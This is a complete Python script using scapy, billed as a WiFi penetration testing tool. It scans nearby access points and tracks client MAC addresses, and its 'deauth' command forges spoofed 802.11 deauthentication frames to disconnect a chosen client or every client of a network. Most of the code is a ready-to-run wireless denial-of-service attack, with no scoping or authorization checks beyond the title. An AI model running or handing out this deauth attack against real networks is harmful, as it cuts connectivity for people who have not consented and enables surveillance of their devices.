#!/usr/bin/env python3
"""
WiFi Penetration Testing Tool

[Same description and requirements as original]

Changelog:
- Improved Windows compatibility handling
- Added thread-safe data structures
- Enhanced error handling
- Better channel parsing
- Added monitor mode verification
"""

import argparse
import os
import signal
import sys
import time
from datetime import datetime
from threading import Lock
import platform
import threading

try:
    from scapy.all import (
        Dot11, Dot11Beacon, Dot11ProbeResp, Dot11Elt,
        RadioTap, sniff, sendp, conf
    )
    from scapy.layers.dot11 import Dot11Deauth
except ImportError:
    print("Error: This script requires scapy. Install with: pip install scapy")
    sys.exit(1)

# Thread-safe global variables
access_points = {}
clients = {}
ap_lock = Lock()
client_lock = Lock()
interface = None
channel_hopper_active = False


def is_admin():
    """Check if the script is running with administrator privileges."""
    try:
        if platform.system() == "Windows":
            import ctypes
            return ctypes.windll.shell32.IsUserAnAdmin() != 0
        else:
            return os.geteuid() == 0
    except AttributeError:
        print("Warning: Unable to check admin privileges. Some features may not work.")
        return False


def check_monitor_mode(iface):
    """Verify if the interface is in monitor mode."""
    if platform.system() == "Windows":
        # Windows requires specific drivers/tools to check monitor mode
        print("Warning: Monitor mode verification not implemented for Windows")
        return True
    else:
        try:
            output = os.popen(f"iwconfig {iface}").read()
            return "Mode:Monitor" in output
        except Exception as e:
            print(f"Error checking monitor mode: {e}")
            return False


def parse_arguments():
    """Parse command line arguments."""
    parser = argparse.ArgumentParser(description="WiFi Penetration Testing Tool")
    parser.add_argument("-i", "--interface", required=True, help="Wireless interface in monitor mode")
    parser.add_argument("-t", "--scan-time", type=int, default=60, help="Scan time in seconds (default: 60)")
    parser.add_argument("-c", "--channel", type=int, choices=range(1, 15), help="Set specific channel (1-14)")

    subparsers = parser.add_subparsers(dest="command", help="Commands")

    scan_parser = subparsers.add_parser("scan", help="Scan for wireless networks")

    deauth_parser = subparsers.add_parser("deauth", help="Send deauthentication packets")
    deauth_parser.add_argument("-b", "--bssid", required=True, help="Target AP MAC address")
    deauth_parser.add_argument("-c", "--client", help="Target client MAC address (default: broadcast)")
    deauth_parser.add_argument("-n", "--num-packets", type=int, default=10, help="Number of deauth packets to send")

    return parser.parse_args()


def set_channel(channel):
    """Set the wireless interface to a specific channel."""
    try:
        if platform.system() == "Windows":
            print("Warning: Channel setting on Windows requires specific drivers/tools")
            print("Please ensure your adapter is set to the correct channel manually")
        else:
            os.system(f"iwconfig {interface} channel {channel}")
            print(f"[*] Channel set to {channel}")
    except Exception as e:
        print(f"Error setting channel: {e}")
        return False
    return True


def channel_hopper():
    """Hop through channels 1-14."""
    global channel_hopper_active
    channel_hopper_active = True

    try:
        while channel_hopper_active:
            for channel in range(1, 15):
                if set_channel(channel):
                    time.sleep(0.5)
                if not channel_hopper_active:
                    break
    except Exception as e:
        print(f"Channel hopping error: {e}")
    finally:
        channel_hopper_active = False


def handle_packet(packet):
    """Process captured packets to identify APs and clients."""
    if not packet.haslayer(Dot11):
        return

    # Handle beacon/probe response frames
    if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
        bssid = packet[Dot11].addr2
        if not bssid:
            return

        try:
            ssid = packet[Dot11Elt].info.decode('utf-8', errors='ignore')
        except:
            ssid = "Hidden SSID"

        # Get channel more robustly
        channel = 0
        elt = packet.getlayer(Dot11Elt)
        while elt and elt.ID != 3:  # DS Parameter Set
            elt = elt.payload.getlayer(Dot11Elt)
        if elt and elt.ID == 3:
            try:
                channel = int(elt.info[0])
            except:
                pass

        encryption = determine_encryption(packet)
        signal = packet[RadioTap].dBm_AntSignal if packet.haslayer(RadioTap) else "N/A"

        with ap_lock:
            access_points[bssid] = {
                'ssid': ssid,
                'channel': channel,
                'encryption': encryption,
                'signal': signal,
                'first_seen': datetime.now(),
                'last_seen': datetime.now()
            }

        print(f"[+] New AP: {ssid} ({bssid}), Channel: {channel}, Encryption: {encryption}, Signal: {signal}")

    # Handle client data frames
    if packet.haslayer(Dot11) and packet.getlayer(Dot11).type == 2:
        src = packet.getlayer(Dot11).addr2
        dst = packet.getlayer(Dot11).addr1
        bssid = packet.getlayer(Dot11).addr3

        if bssid in access_points and src != bssid and src:
            with client_lock:
                if src not in clients:
                    clients[src] = {
                        'associated_ap': bssid,
                        'first_seen': datetime.now(),
                        'last_seen': datetime.now(),
                        'packets': 1
                    }
                    print(f"[+] New client: {src} associated with {access_points[bssid]['ssid']} ({bssid})")
                else:
                    clients[src]['last_seen'] = datetime.now()
                    clients[src]['packets'] += 1


def determine_encryption(packet):
    """Determine encryption type from beacon frame."""
    capability = packet.sprintf("{Dot11Beacon:%Dot11Beacon.cap%}") or packet.sprintf(
        "{Dot11ProbeResp:%Dot11ProbeResp.cap%}")

    if "privacy" not in capability:
        return "Open"

    for element in packet.getlayer(Dot11Elt):
        if element.ID == 48:
            return "WPA2"
        elif element.ID == 221 and element.info.startswith(b'\x00\x50\xf2\x01'):
            return "WPA"

    return "WEP" if "privacy" in capability else "Unknown"


def perform_deauth(bssid, client_mac, num_packets):
    """Send deauthentication packets to a specific client or broadcast."""
    if client_mac is None:
        client_mac = "ff:ff:ff:ff:ff:ff"

    print(f"[*] Sending {num_packets} deauth packets to {client_mac} from {bssid}")

    try:
        packet = RadioTap() / Dot11(addr1=client_mac, addr2=bssid, addr3=bssid) / Dot11Deauth(reason=7)
        for _ in range(num_packets):
            sendp(packet, iface=interface, verbose=0)
            time.sleep(0.1)
        print("[+] Deauth attack completed")
    except Exception as e:
        print(f"Error during deauth attack: {e}")


def print_results():
    """Print a summary of discovered networks and clients."""
    with ap_lock, client_lock:
        print("\n" + "=" * 80)
        print("SCAN RESULTS")
        print("=" * 80)

        print("\nAccess Points:")
        print("-" * 80)
        print(f"{'BSSID':<18} {'SSID':<32} {'Channel':<8} {'Encryption':<10} {'Signal':<8}")
        print("-" * 80)

        for bssid, ap_info in access_points.items():
            print(
                f"{bssid:<18} {ap_info['ssid'][:31]:<32} {ap_info['channel']:<8} {ap_info['encryption']:<10} {ap_info['signal']}")

        print("\nClients:")
        print("-" * 80)
        print(f"{'Client MAC':<18} {'Associated AP':<18} {'AP SSID':<32} {'Packets':<8}")
        print("-" * 80)

        for client, client_info in clients.items():
            bssid = client_info['associated_ap']
            ssid = access_points.get(bssid, {}).get('ssid', 'Unknown')
            print(f"{client:<18} {bssid:<18} {ssid[:31]:<32} {client_info['packets']:<8}")


def cleanup(*args):
    """Clean up before exiting."""
    global channel_hopper_active
    channel_hopper_active = False
    print("\n[!] Exiting...")
    sys.exit(0)


def main():
    """Main function."""
    global interface

    if not is_admin():
        print("Error: This script requires administrator privileges.")
        sys.exit(1)

    signal.signal(signal.SIGINT, cleanup)
    args = parse_arguments()
    interface = args.interface

    if not check_monitor_mode(interface):
        print("Error: Interface is not in monitor mode. Please set it to monitor mode first.")
        sys.exit(1)

    conf.iface = interface

    if args.command == "scan":
        print(f"[*] Starting scan on interface {interface}")
        print("[*] Press Ctrl+C to stop scanning")

        if args.channel:
            if not set_channel(args.channel):
                sys.exit(1)
        else:
            hopper_thread = threading.Thread(target=channel_hopper)
            hopper_thread.daemon = True
            hopper_thread.start()

        sniff(iface=interface, prn=handle_packet, timeout=args.scan_time)
        print_results()

    elif args.command == "deauth":
        if args.channel and not set_channel(args.channel):
            sys.exit(1)
        perform_deauth(args.bssid, args.client, args.num_packets)

    else:
        print("Error: No command specified. Use 'scan' or 'deauth'.")


if __name__ == "__main__":
    main()
